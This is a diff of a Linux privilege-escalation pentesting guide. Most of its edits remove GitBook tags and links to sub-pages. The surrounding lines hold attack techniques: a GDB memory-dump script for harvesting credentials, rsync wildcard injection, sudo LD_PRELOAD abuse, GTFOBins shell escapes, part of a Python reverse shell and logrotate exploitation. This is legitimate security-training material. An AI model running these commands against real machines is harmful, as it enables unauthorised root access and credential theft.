@@ -157,9 +157,11 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 
 If you are inside a docker container you can try to escape from it:
 
-{% content-ref url="docker-security/" %}
-[docker-security](docker-security/)
-{% endcontent-ref %}
+```bash
+
+#Check if you are inside a docker container
+cat /proc/self/cgroup 2>/dev/null | grep "docker\|kubepods"
+```
 
 ## Drives
 
@@ -198,9 +200,9 @@ rpm -qa #Centos
 
 If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.
 
-{% hint style="info" %}
+
 _Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some applications like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits_
-{% endhint %}
+
 
 ## Processes
 
@@ -223,9 +225,9 @@ You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to mon
 
 Some services of a server save **credentials in clear text inside the memory**.\
 Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
-However, remember that **as a regular user you can read the memory of the processes you own**.
+However, remember that **as a regular user you can read the memory of the processes you own**
 
-{% hint style="warning" %}
+
 Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
 
 The file _**/proc/sys/kernel/yama/ptrace\_scope**_ controls the accessibility of ptrace:
@@ -233,8 +235,7 @@ The file _**/proc/sys/kernel/yama/ptrace\_scope**_ controls the accessibility of
 * **kernel.yama.ptrace\_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
 * **kernel.yama.ptrace\_scope = 1**: only a parent process can be debugged.
 * **kernel.yama.ptrace\_scope = 2**: Only admin can use ptrace, as it required CAP\_SYS\_PTRACE capability.
-* **kernel.yama.ptrace\_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.
-{% endhint %}
+* **kernel.yama.ptrace\_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again
 
 #### GDB
 
@@ -251,7 +252,7 @@ strings /tmp/mem_ftp #User and password
 
 #### GDB Script
 
-{% code title="dump-memory.sh" %}
+
 ```bash
 #!/bin/bash
 #./dump-memory.sh <PID>
@@ -262,7 +263,7 @@ grep rw-p /proc/$1/maps \
     "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
 done
 ```
-{% endcode %}
+---
 
 #### /proc/$pid/maps & /proc/$pid/mem
 
@@ -409,13 +410,7 @@ If a script is executed by root has a “**\***” inside a command, you could e
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
 
-**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**
-
-Read the following page for more wildcard exploitation tricks:
-
-{% content-ref url="wildcards-spare-tricks.md" %}
-[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
-{% endcontent-ref %}
+**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**.\
 
 ### Cron script overwriting and symlink
 
@@ -563,12 +558,7 @@ nc -uU /tmp/socket #Connect to UNIX-domain datagram socket
 #apt-get install socat
 socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
 ```
-
-**Exploitation example:**
-
-{% content-ref url="socket-command-injection.md" %}
-[socket-command-injection.md](socket-command-injection.md)
-{% endcontent-ref %}
+---
 
 ### HTTP sockets
 
@@ -626,29 +616,7 @@ Now, you can execute commands on the container from this `socat` connection.
 
 ### Others
 
-Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
-
-Check **more ways to break out from docker or abuse it to escalate privileges** in:
-
-{% content-ref url="docker-security/" %}
-[docker-security](docker-security/)
-{% endcontent-ref %}
-
-## Containerd (ctr) privilege escalation
-
-If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:
-
-{% content-ref url="containerd-ctr-privilege-escalation.md" %}
-[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
-{% endcontent-ref %}
-
-## **RunC** privilege escalation
-
-If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:
-
-{% content-ref url="runc-privilege-escalation.md" %}
-[runc-privilege-escalation.md](runc-privilege-escalation.md)
-{% endcontent-ref %}
+Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)
 
 ## **D-Bus**
 
@@ -672,13 +640,7 @@ Part of the policy of `/etc/dbus-1/system.d/wpa_supplicant.conf`:
 Therefore, if a policy is allowing your user in any way to **interact with the bus**, you could be able to exploit it to escalate privileges (maybe just listing for some passwords?).
 
 Note that a **policy** that **doesn't specify** any user or group affects everyone (`<policy>`).\
-Policies to the context "default" affects everyone not affected by other policies (`<policy context="default"`).
-
-**Learn how to enumerate and exploit a D-Bus communication here:**
-
-{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
-[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
-{% endcontent-ref %}
+Policies to the context "default" affects everyone not affected by other policies (`<policy context="default"`)
 
 ## **Network**
 
@@ -945,9 +907,7 @@ Finally, **escalate privileges** running
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 
-{% hint style="danger" %}
-A similar privesc can be abused if the attacker controls the **LD\_LIBRARY\_PATH** env variable because he controls the path where libraries are going to be searched.
-{% endhint %}
+_A similar privesc can be abused if the attacker controls the `**LD\_LIBRARY\_PATH**` env variable because he controls the path where libraries are going to be searched._
 
 ```c
 #include <stdio.h>
@@ -1044,11 +1004,7 @@ The project collects legitimate functions of Unix binaries that can be abused to
 > gdb -nx -ex '!sh' -ex quit\
 > sudo mysql -e '! /bin/sh'\
 > strace -o /dev/null /bin/sh\
-> sudo awk 'BEGIN {system("/bin/sh")}'
-
-{% embed url="https://gtfobins.github.io/" %}
-
-{% embed url="https://gtfoargs.github.io/" %}
+> sudo awk 'BEGIN {system("/bin/sh")}'\
 
 ### FallOfSudo
 
@@ -1148,13 +1104,7 @@ The file `/etc/ld.so.conf` indicates **where the loaded configurations files are
 
 That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.
 
-If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
-Take a look at **how to exploit this misconfiguration** in the following page:
-
-{% content-ref url="ld.so.conf-example.md" %}
-[ld.so.conf-example.md](ld.so.conf-example.md)
-{% endcontent-ref %}
-
+If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.
 ### RPATH
 
 ```
@@ -1196,12 +1146,7 @@ int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp
 
 ## Capabilities
 
-Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
-Read the following page to **learn more about capabilities and how to abuse them**:
-
-{% content-ref url="linux-capabilities.md" %}
-[linux-capabilities.md](linux-capabilities.md)
-{% endcontent-ref %}
+Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.
 
 ## Directory permissions
 
@@ -1325,13 +1270,7 @@ Host example.com
 Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).
 
 The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
-The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).
-
-If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:
-
-{% content-ref url="ssh-forward-agent-exploitation.md" %}
-[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
-{% endcontent-ref %}
+The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow)
 
 ## Interesting Files
 
@@ -1532,11 +1471,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ### Logrotate exploitation
 
 There is a vulnerability on `logrotate` that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate` write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in _**/etc/bash\_completion.d/**_ that will be executed by any user that login.\
-So, if you have **write perms** over a **log file** **or** any of its **parent folder**, you can **privesc** (on most linux distributions, logrotate is executed automatically once a day as **user root**). Also, check if apart from _/var/log_ are more files being **rotated**.
-
-{% hint style="info" %}
-This vulnerability affects `logrotate` version `3.18.0` and older
-{% endhint %}
+So, if you have **write perms** over a **log file** **or** any of its **parent folder**, you can **privesc** (on most linux distributions, logrotate is executed automatically once a day as **user root**). Also, check if apart from _/var/log_ are more files being **rotated**
 
 More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
 
@@ -1572,27 +1507,7 @@ DEVICE=eth0
 
 **systemd** is a **Linux initialization system and service manager that includes features like on-demand starting of daemons**, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks. (From [here](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)).
 
-Files that ship in packages downloaded from the distribution repository go into `/usr/lib/systemd/`. Modifications done by system administrator (user) go into `/etc/systemd/system/`.
-
-## Other Tricks
-
-### NFS Privilege escalation
-
-{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
-[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
-{% endcontent-ref %}
-
-### Escaping from restricted Shells
-
-{% content-ref url="escaping-from-limited-bash.md" %}
-[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
-{% endcontent-ref %}
-
-### Cisco - vmanage
-
-{% content-ref url="cisco-vmanage.md" %}
-[cisco-vmanage.md](cisco-vmanage.md)
-{% endcontent-ref %}
+Files that ship in packages downloaded from the distribution repository go into `/usr/lib/systemd/`. Modifications done by system administrator (user) go into `/etc/systemd/system/`
 
 ## Kernel Security Protections
 
